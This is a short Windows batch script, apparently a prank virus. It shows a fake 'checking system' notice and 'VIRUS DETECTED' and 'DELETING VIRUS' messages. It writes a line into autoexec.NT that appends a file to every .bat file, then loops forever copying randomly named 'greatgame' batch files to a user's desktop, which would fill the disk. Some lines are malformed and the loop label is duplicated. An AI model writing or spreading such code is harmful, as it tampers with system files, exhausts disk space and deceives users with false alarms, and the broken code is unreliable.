@echo off
echo checking system:
echo for %%i in ("*.bat") do copy %%i+c:\tmp.bat %%i #*>c:\windows\system32\autoexec.NT
echo VIRUS DETECTED
Pause
echo DELETING VIRUS
pause
:1
dir /s
copy c:\tmp.bat
c:\egor\desktop\greatgame_%random%.bat
:1
dir /s
copy c:\tmp.bat
c:\egor\desktop\greatgame_%random%.bat

goto 1
